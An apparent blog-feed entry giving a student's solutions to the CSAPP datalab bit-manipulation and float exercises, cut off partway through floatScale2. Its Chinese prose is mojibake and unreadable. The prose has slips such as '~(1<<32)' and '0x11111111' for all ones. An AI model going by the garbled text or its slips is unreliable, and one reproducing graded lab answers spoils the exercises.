    <content type="html"><![CDATA[<p>å“¦æˆ‘çš„ä¸Šå¸å®éªŒæ€ä¹ˆæ˜¯è‹±æ–‡ç‰ˆçš„ğŸ˜¶â€ğŸŒ«ï¸</p><span id="more"></span><p>ä¸Šå‘¨å°å­¦æœŸä¸€ç›´åšé¡¹ç›®æ²¡å­¦ä¹ ï¼Œæ­£å¥½åšåšå®éªŒå¤ä¹ ä¸€ä¸‹</p><h2 id="int"><a href="#int" class="headerlink" title="int"></a>int</h2><h3 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h3><p>é¢˜ç›®è¦æ±‚ï¼šåªä½¿ç”¨ ~ å’Œ &amp; æ¥å®ç° ^ æ“ä½œ</p><blockquote><p>å¤ä¹ ç¯èŠ‚</p><p>~  æŒ‰ä½éï¼ˆæ¯ä½äºŒè¿›åˆ¶å–åï¼‰ï¼Œ&amp; æŒ‰ä½ä¸ï¼ˆå¯¹åº”ä½åŒä¸º1ç»“æœä½æ‰ä¸º1ï¼‰,| æŒ‰ä½æˆ–ï¼ˆåªè¦æœ‰ä¸€ä½æ˜¯1ç»“æœä½å°±æ˜¯1ï¼‰ï¼Œ^ äº¦æˆ–ï¼ˆå¯¹åº”ä½ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1ï¼‰</p></blockquote><p>é¦–å…ˆå¯ä»¥æƒ³åˆ° <code>x^y = x&amp;~y + ~x&amp;y = (x&amp;~y)|(~x&amp;y)</code></p><p>æ¥ä¸‹æ¥æƒ³åŠæ³•æ›¿ä»£ <code>|</code>ï¼Œ<code>x|y=~(~x&amp;~y)</code>ï¼Œæ‰€ä»¥æœ€åçš„ç»“æœæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * bitXor - x^y using only ~ and &amp; </span><br><span class="hljs-comment"> *   Example: bitXor(4, 5) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp;</span><br><span class="hljs-comment"> *   Max ops: 14</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bitXor</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-keyword">return</span> ~(~(x&amp;~y)&amp;~(~x&amp;y));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><p>é¢˜ç›®è¦æ±‚ï¼šä½¿ç”¨ ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; æ¥è·å– int çš„æœ€å°å€¼</p><blockquote><p>å¤ä¹ ç¯èŠ‚</p><p>ï¼é€»è¾‘éï¼Œ&lt;&lt; å·¦ç§»ï¼Œ &gt;&gt; å³ç§»</p></blockquote><p>æœ€å°å€¼å…¶å®å°±æ˜¯1åé¢31ä¸ª0ï¼Œä½†æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è¶…è¿‡ 8bit çš„å¸¸æ•°ã€‚å¯ä»¥ä½¿ç”¨å·¦ç§»è¿ç®—ï¼Œè®©åˆå§‹å¸¸æ•°1å·¦ç§»31ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * tmin - return minimum two&#x27;s complement integer </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 4</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">tmin</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>é¢˜ç›®è¦æ±‚ï¼šåˆ¤æ–­ x æ˜¯ä¸æ˜¯ int çš„æœ€å¤§å€¼</p><blockquote><p>å¤ä¹ ç¯èŠ‚ï¼š</p><p>! é€»è¾‘éï¼Œå°†éé›¶æ•°å€¼è½¬æ¢ä¸º1ï¼Œè€Œ 0 ä¿æŒä¸å˜</p></blockquote><p>æ ¹æ®ä¸Šé¢˜æˆ‘ä»¬å¾—å‡ºæœ€å°å€¼ï¼Œå–åå°±èƒ½å¾—åˆ°æœ€å¤§å€¼ä¹Ÿå°±æ˜¯ <code>~(1&lt;&lt;32)</code> ã€‚</p><p>å¦‚æœ x å’Œæœ€å¤§å€¼ä¸€æ ·ï¼Œé‚£ä¹ˆæ¯ä¸€ä½éƒ½æ˜¯ä¸€æ ·çš„çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¼‚æˆ–æ“ä½œå¦‚æœä¸¤è¾¹ç›¸ç­‰å°±è¿”å› 0ï¼Œæœ€åé€»è¾‘éå°†0è½¬åŒ–ä¸º1å°±è¡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span><br><span class="hljs-comment"> *     and 0 otherwise </span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | +</span><br><span class="hljs-comment"> *   Max ops: 10</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isTmax</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !(~(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>)^x);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>é¢˜ç›®è¦æ±‚ï¼šåˆ¤æ–­æ‰€ç»™å‡ºçš„æ•°å­—å¥‡æ•°ä½æ˜¯å¦éƒ½ä¸º 1 ã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤º0xAAAAAAAAçš„å¥‡æ•°ä½éƒ½æ˜¯1ï¼Œå¶æ•°ä½éƒ½æ˜¯0ï¼Œæˆ‘ä»¬è€ƒè™‘ç›´æ¥ç”¨å®ƒæ¥å’ŒåŸæ¥çš„æ•°å­—è¿›è¡ŒæŒ‰ä½ä¸è¿ç®—å†å’ŒAAAå¼‚æˆ–ã€‚ä½†åˆç”±äºä½æ•°ä¸èƒ½è¶…è¿‡ 8 bitï¼Œéœ€è¦åˆ©ç”¨å·¦ç§»è¿ç®—ï¼Œå·¦ç§»ä»¥åå†å’ŒåŸæ¥çš„å€¼è¿›è¡Œä¸è¿ç®—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span><br><span class="hljs-comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span><br><span class="hljs-comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">allOddBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>     <span class="hljs-type">int</span> y=(<span class="hljs-number">0xAA</span>&lt;&lt; <span class="hljs-number">8</span>)|<span class="hljs-number">0xAA</span>;<br>     y= y|(y&lt;&lt;<span class="hljs-number">16</span>);<br>     <span class="hljs-keyword">return</span> !((y&amp;x)^y) ;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>é¢˜ç›®è¦æ±‚ï¼šå–ç›®æ ‡æ•°å€¼çš„ç›¸åæ•°</p><p>è´Ÿæ•°å°±æ˜¯æŒ‰ä½å–åä»¥ååŠ ä¸€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * negate - return -x </span><br><span class="hljs-comment"> *   Example: negate(1) = -1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 5</span><br><span class="hljs-comment"> *   Rating: 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">negate</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-keyword">return</span> ~x+<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><p>é¢˜ç›®è¦æ±‚ï¼šå¦‚æœ 0x30 &lt;&#x3D; x &lt;&#x3D; 0x39ï¼Œåˆ™è¿”å› 1</p><p>åˆ¤æ–­ç›®æ ‡å€¼å’Œå·²çŸ¥æ•°å€¼çš„å¤§å°åªè¦åšå‡æ³•å°±å¯ä»¥ï¼Œä½†æ˜¯è¿™ä¸ªå¼å­ä¸èƒ½ç”¨ - ï¼Œè€ƒè™‘æŒ‰ç…§ä¸Šé¢˜æ–¹æ³•å–ååç›¸åŠ ï¼Œå†çœ‹ç»“æœå€¼ç¬¦å·ä½çš„æ­£è´Ÿå³å¯ã€‚</p><blockquote><p>æ‹¬å·ä¸€å®šè¦æ‹¬å¯¹ğŸ˜¿</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> !((x+(~<span class="hljs-number">0x30</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>))&amp;!!((x+(~<span class="hljs-number">0x3a</span>+<span class="hljs-number">1</span>))&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç° x ? y : z ï¼ˆx ä¸ä¸º 0 è¿”å› y ï¼Œä¸º 0 è¿”å› z ï¼‰</p><p>å¯¹äº x æ˜¯å¦ä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡ ! è¿ç®—æ¥å®ç°å³ <code>!!0=0</code> ï¼Œ<code>!!3=1</code> ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œä»»ä½•ä¹¦ä¸æ‰€æœ‰ä½å…¨æ˜¯1çš„å€¼çš„ç»“æœéƒ½æ˜¯å®ƒæœ¬èº«ï¼ŒåŒæ ·ä¸ä½å…¨æ˜¯0çš„æ•°å°±æ˜¯0ã€‚æ ¹æ®æ©ç çš„è§„èŒƒï¼Œæ‰€æœ‰ä½éƒ½æ˜¯ 1 çš„å€¼æ˜¯åè¿›åˆ¶çš„ -1ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹é€»è¾‘ä¸ä¹‹åçš„ç»“æœå–å€’æ•°å°±æ˜¯ <code>(~!!x+1)</code> ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">conditional</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> z)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((~!!x+<span class="hljs-number">1</span>)&amp;y)|(~(~!!x+<span class="hljs-number">1</span>)&amp;z);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>é¢˜ç›®è¦æ±‚ï¼šå¦‚æœ x &lt;&#x3D; y åˆ™è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0</p><p>æœ¬æ¥æƒ³çš„æ˜¯åƒå‰é¢çš„é¢˜ä¸€æ ·ç›´æ¥ç›¸å‡å°±è¡Œäº†ï¼Œä½†æ˜¯æƒ³åˆ°å¯èƒ½ä¼šæœ‰æº¢å‡ºçš„é—®é¢˜ã€‚</p><p>è§£å†³æ–¹æ³•æ˜¯å…ˆåˆ¤æ–­ç¬¦å·ä½ï¼Œå¦‚æœä¸¤ä¸ªæ•°ç¬¦å·ç›¸åŒå†åšå·®ï¼Œç¬¦å·ä¸åŒå°±å¯ä»¥ç›´æ¥è¿”å›ç»“æœäº†ã€‚</p><table><thead><tr><th>æ­£è´Ÿ</th><th>sign_x</th><th>sign_y</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td>xæ­£ yè´Ÿ</td><td>0</td><td>1</td><td>0</td></tr><tr><td>yæ­£ xè´Ÿ</td><td>1</td><td>0</td><td>1</td></tr></tbody></table><p>è§‚å¯Ÿç»“æœå¯ä»¥å‘ç°è¿”å›å€¼å°±ç­‰äº <code>sign_x&amp;(!sign_y)</code> ã€‚</p><p>è¿˜éœ€è¦è€ƒè™‘ä¸¤ä¸ªæ•°ç›¸ç­‰çš„æƒ…å†µï¼Œç›¸ç­‰æ—¶ç¬¦å·ä½ä¸º 0 ã€‚å¯ä»¥è½¬æ¢æ€è·¯ç»•è¿‡è¿™ä¸ªæƒ…å†µï¼Œåœ¨æ•°æ®éƒ½æ˜¯æ•´æ•°æ—¶ <code>x&lt;=y</code> ä¹Ÿå°±æ˜¯ <code>x&lt;y+1</code>ï¼Œæ‰€ä»¥åšå·®çš„è®¡ç®—å¼å°±å˜æˆäº† <code>x+(~y+1)-1</code> ä¹Ÿå°±æ˜¯ <code>x+~y</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>    <span class="hljs-type">int</span> sign_x=x&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> sign_y=y&gt;&gt;<span class="hljs-number">31</span>;<br>    <span class="hljs-type">int</span> result1=sign_x&amp;(!sign_y); <span class="hljs-comment">//ç¬¦å·ä¸åŒçš„è¿”å›ç»“æœ</span><br>    <span class="hljs-type">int</span> flag=!(sign_x^sign_y);   <span class="hljs-comment">//åˆ¤æ–­ç¬¦å·æ˜¯å¦ç›¸åŒ</span><br>    <span class="hljs-keyword">return</span> result1|flag&amp;((x + ~y) &gt;&gt; <span class="hljs-number">31</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç°é€»è¾‘éçš„åŠŸèƒ½</p><p>é€»è¾‘éæ— éå°±æ˜¯éœ€è¦æƒ³ä¸€æƒ³ 0 å’Œéé›¶æ•°ä¹‹é—´çš„åŒºåˆ«ã€‚0 çš„æ­£è´Ÿæ•°éƒ½ç›¸ç­‰ï¼Œä½†æ˜¯å…¶ä»–æ•°çš„æ­£è´Ÿä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å°†ç›®æ ‡æ•°æ®å–ç›¸åæ•°åå¼‚æˆ–ï¼Œå†åˆ¤æ–­ç¬¦å·ä½ï¼Œç›¸åŒè¿”å› 0ï¼Œä¸åŒè¿”å› 1 ã€‚</p><p>ç”±äºç¬¦å·ä½ä¸º 1 ï¼Œå³ç§»åçš„ç»“æœä¾¿ä¸º0x11111111, ä»¤å…¶åŠ  1 ï¼Œåˆšå¥½ä¸º 0ï¼ˆè¿™æ˜¯å› ä¸ºåœ¨è¡¥ç è¡¨ç¤ºæ³•ä¸­ï¼Œè´Ÿæ•°çš„ç»å¯¹å€¼å¯ä»¥é€šè¿‡å–ååŠ 1æ¥è·å¾—ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> ((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>é¢˜ç›®è¦æ±‚ï¼šè¿”å›è¡¨ç¤º x æ‰€éœ€çš„æœ€å°ä½æ•°</p><p><del>è¿™é“é¢˜å®Œå…¨æ²¡æ€è·¯ï¼Œæ˜¯çœ‹åˆ«çš„å¸ˆå‚…çš„åšå®¢æ‰æ˜ç™½çš„</del></p><p>é¦–å…ˆè®©æ‰€æœ‰çš„æ•°æ®éƒ½å˜æˆæ­£å€¼ï¼Œç„¶ååˆ©ç”¨äºŒåˆ†æ³•æ¥åˆ¤æ–­äºŒåˆ†åçš„æœ€é«˜ä½æ˜¯å¦å…¨æ˜¯0ï¼Œå†åˆ¤æ–­æ˜¯å¦å…¨æ˜¯1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> sign ;<br>    sign = x&gt;&gt;<span class="hljs-number">31</span>;<br>    x = (~x&amp;sign)|(~sign&amp;x);   <span class="hljs-comment">//å…¨éƒ¨æ¢æˆä¸ºæ­£æ•°</span><br>    <br>    <span class="hljs-type">int</span> bit_16 =(!!(x &gt;&gt; <span class="hljs-number">16</span>)) &lt;&lt; <span class="hljs-number">4</span>;    <span class="hljs-comment">//æ£€æµ‹æ˜¯å¦æœ‰1</span><br>    x = x &gt;&gt; bit_16;      <span class="hljs-comment">//å°†å·²ç»æ£€æµ‹è¿‡çš„é«˜16ä½ç§»å‡ºå»ç•™ä¸‹ä½ä½</span><br><span class="hljs-type">int</span> bit_8 = !!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;<br>x = x &gt;&gt; bit_8;<br>  <span class="hljs-type">int</span> bit_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; bit_4;<br>  <span class="hljs-type">int</span> bit_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; bit_2;<br>  <span class="hljs-type">int</span> bit_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  x = x &gt;&gt; bit_1;<br>  <span class="hljs-type">int</span> bit_0 = x;<br>  <span class="hljs-keyword">return</span> bit_16+bit_8+bit_4+bit_2+bit_1+bit_0+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="float"><a href="#float" class="headerlink" title="float"></a>float</h2><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>é¢˜ç›®è¦æ±‚ï¼šå°†ä¼ å…¥çš„æ— ç¬¦å·æ•´å‹æ•°è½¬æ¢ä¸ºæµ®ç‚¹æ•° <code>f*2</code> è¿”å›</p><blockquote><p>å¤ä¹ ç¯èŠ‚ï¼š</p><p>æµ®ç‚¹æ•°æœ‰ä¸‰éƒ¨åˆ†ï¼Œç¬¦å· sï¼ˆæœ€é«˜ä½ï¼‰ ï¼Œé˜¶ç  expï¼ˆå…«ä½ï¼‰å’Œ å°¾æ•° fracã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p></blockquote><p>å…ˆåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œå†åˆ†ä¸åŒæ¡ä»¶è¿›è¡Œåˆ¤æ–­</p><ul><li><p>exp&#x3D;&#x3D;0</p><p>æ­¤æ—¶æµ®ç‚¹æ•°çš„å€¼æ˜¯ä¸€ä¸ªæ¥è¿‘äº 0 çš„äºŒè¿›åˆ¶å°æ•°ï¼Œå¯ä»¥é€šè¿‡å°†å°¾æ•°éƒ¨åˆ†å·¦ç§» 1 ä½æ¥å°†å…¶ä¹˜ä»¥ 2ã€‚ç„¶åï¼Œå°†ç¬¦å·ä½é‡æ–°æ·»åŠ å›å»ï¼Œå¾—åˆ°ä¹˜ä»¥ 2 åçš„è§„æ ¼åŒ–æµ®ç‚¹æ•°ã€‚</p></li><li><p>exp&#x3D;&#x3D;255</p><p>æŒ‰é¢˜ç›®è¦æ±‚ç›´æ¥è¿”å› uf</p></li><li><p>å…¶ä»–æƒ…å†µ</p><p>exp æŒ‡æ•°åŠ 1ï¼Œå¯¹å®ƒä¹˜2^1ä¹Ÿå°±æ˜¯ä¹˜2</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsign int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-comment">// åˆ†ç¦»ç¬¦å·ä½</span><br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// åˆ†ç¦»æŒ‡æ•°ä½</span><br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-comment">// åˆ†ç¦»å°¾æ•°ä½</span><br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span 